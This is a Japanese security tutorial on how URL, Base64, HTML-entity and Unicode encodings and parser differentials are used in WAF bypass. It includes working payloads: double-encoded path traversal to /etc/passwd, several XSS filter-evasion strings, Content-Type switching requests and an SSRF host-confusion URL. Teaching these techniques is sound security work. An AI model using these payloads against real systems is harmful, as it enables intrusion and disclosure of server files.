Encoding & Serialization

エンコーディングとシリアライゼーションの差異を理解し、WAF bypass や parser differential 攻撃の基礎を身につける。

Theory Hands-on Practice

URL Encoding (Percent Encoding)

URL で使用できない文字を %HH (16進数) 形式に変換する。RFC 3986 で規定。 セキュリティ上重要なのは、デコードのタイミングと回数。

基本的な変換

文字Encoded用途
<%3CXSS payload に必須
>%3EXSS payload に必須
/%2FPath traversal
.%2EPath traversal (..)
&%26Parameter pollution
=%3DParameter injection
space%20 or +Context dependent

Double Encoding

WAF やフィルタが1回だけデコードして検査する場合、2重エンコードでバイパスできる。 アプリケーションが2回目のデコードを行い、最終的に悪意のある文字列が復元される。 

# 通常のエンコード (WAF がブロック)
../etc/passwd → %2e%2e%2fetc%2fpasswd

# Double encoding (WAF をバイパス)
%2e → %252e (% 自体を %25 にエンコード)
../ → %252e%252e%252f

# WAF が1回デコード → %2e%2e%2f (無害に見える)
# アプリが2回目デコード → ../ (path traversal 成立)

BB視点: Double Encoding は WAF bypass の定番

Cloudflare, AWS WAF, ModSecurity などの WAF が1回デコードして検査する場合に有効。 Path traversal, XSS, SQL Injection のフィルタ回避で頻出。 Burp の Decoder タブで手動エンコード/デコードを繰り返して検証する。

Base64

バイナリデータを ASCII テキストに変換するエンコーディング。暗号化ではない。 HTTP ヘッダー、Cookie、JWT の transport に広く使われる。

Variant に注意

Variant文字セット用途
Standard (RFC 4648)A-Z, a-z, 0-9, +, /Email (MIME), PEM
URL-safeA-Z, a-z, 0-9, -, _JWT, URL parameter
No padding= を省略JWT (常に padding なし)
 
# Base64 decode (コマンドライン)
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
# → admin:password

# Python
import base64
base64.b64decode("YWRtaW46cGFzc3dvcmQ=")
# → b'admin:password'

# URL-safe Base64 (JWT で使用)
base64.urlsafe_b64decode("eyJhbGciOiJIUzI1NiJ9")
BB視点: Base64 は「隠しているだけ」

Cookie やトークンが Base64 で「暗号化」されているように見えても、単なるエンコード。 デコードすると JSON や serialized object が出てくることが多い。 改ざんして re-encode すれば privilege escalation が成立する場合がある。

HTML Entities

HTML で特殊文字を安全に表示するためのエンコーディング。XSS 対策の基本だが、Context によっては不十分。

文字Entity (名前)Entity (数値)
<&lt;&#60; / &#x3C;
>&gt;&#62;
&&amp;&#38;
"&quot;&#34;
'&apos;&#39;

Context-dependent な XSS bypass

<!-- HTML body context: entity が有効 -->
&lt;script&gt; → 安全 (ブラウザが entity を表示するだけ)

<!-- しかし JavaScript context では entity は解釈されない -->
<script>var x = '&lt;injection&gt;';</script>
→ entity がそのまま文字列になるだけ。逆に ' を使えば脱出可能。

<!-- href/src context: javascript: scheme -->
<a href="javascript:alert(1)">click</a>
<a href="java&#x73;cript:alert(1)">click</a> ← entity デコード後に実行

Unicode Normalization

Unicode は同じ「見た目」の文字を複数の方法で表現できる。正規化 (Normalization) の差異が セキュリティフィルタのバイパスに悪用される。

4つの正規化形式

形式説明例
NFCCanonical Decomposition + Compositione + combining accent → e (composed)
NFDCanonical Decompositione → e + combining accent (decomposed)
NFKCCompatibility Decomposition + Compositionfullwidth A (U+FF21) → A
NFKDCompatibility Decompositionfi ligature → f + i

攻撃例: NFKC normalization bypass

# Fullwidth 文字でフィルタバイパス
# U+FF1C = fullwidth <  U+FF1E = fullwidth >
# フィルタは ASCII の <> のみチェック

Input: ＜script＞alert(1)＜/script＞
↓ NFKC normalization (アプリ内部)
Result: <script>alert(1)</script>

# 同様に / (U+FF0F) → / で path traversal
Input: ..／etc／passwd
↓ NFKC
Result: ../etc/passwd
BB視点: Unicode trick の実例

GitHub のファイル名や URL で Unicode normalization を悪用した報告が複数ある。 特に IDN (国際化ドメイン名) での homograph attack、URL parser での normalization timing の差異が狙い目。 Python の unicodedata.normalize('NFKC', input) で事前テスト可能。

JSON vs XML Parsing Differences

JSON の罠

  • Duplicate keys: {"role":"user","role":"admin"} → 実装により最初か最後が優先
  • Unicode escape: < = < → WAF が見逃す可能性
  • Comment injection: 一部パーサーは // や /* */ を許容
  • Numeric overflow: 大きな整数で ID 衝突 (JavaScript の Number.MAX_SAFE_INTEGER 超過)

XML の罠

  • XXE (XML External Entity): 外部ファイル読み取り、SSRF
  • CDATA section: <![CDATA[<script>alert(1)</script>]]>
  • Encoding declaration: <?xml encoding="UTF-7"?> でフィルタバイパス
  • Namespace confusion: 同名要素を異なる namespace で多重定義

Content-Type の挙動差異

リクエストの Content-Type を変更すると、サーバー側の parser が変わり、 フィルタやバリデーションをバイパスできる場合がある。 

# 通常の JSON request (WAF が body を検査)
POST /api/update HTTP/1.1
Content-Type: application/json

{"name":"<script>alert(1)</script>"}

# Content-Type を変更して WAF をバイパス
POST /api/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=%3Cscript%3Ealert(1)%3C%2Fscript%3E

# あるいは multipart で
Content-Type: multipart/form-data; boundary=----
------
Content-Disposition: form-data; name="name"

<script>alert(1)</script>
--------
BB視点: Parser Differential は SSRF/Path Traversal の鍵

URL parser (new URL() in JS vs urllib in Python vs URI in Ruby) の解釈差異で SSRF bypass が成立する。 例: http://evil.com\@target.com で一方は evil.com、他方は target.com を host と解釈。 Orange Tsai の parser differential 研究が必読。

実践: エンコーディングの組み合わせ

# XSS フィルタバイパスの例 (複数エンコーディングの組み合わせ)

# 1. HTML entity + JavaScript
<img src=x onerror="alert(1)">

# 2. URL encoding in href
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>

# 3. Double URL encode for path traversal
GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 4. Unicode normalization + URL encode
GET /api/files/..%EF%BC%8F..%EF%BC%8Fetc%EF%BC%8Fpasswd

# 5. JSON unicode escape for WAF bypass
{"search":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}

Key Takeaways

  • Double encoding は WAF bypass の第一手。パスとパラメータ両方で試す。
  • Base64 は暗号ではない。Cookie やトークンが Base64 なら必ずデコードして中身を確認。
  • Unicode normalization (NFKC) でフィルタバイパス。Fullwidth 文字は強力。
  • Parser differential: URL parser の実装差がSSRF, Path Traversal に直結。
  • Content-Type 変更で WAF 検査ロジックが変わる。JSON→form, form→multipart を試す。
  • Context matters: HTML/JS/URL の各コンテキストでエンコーディングの解釈が異なる。
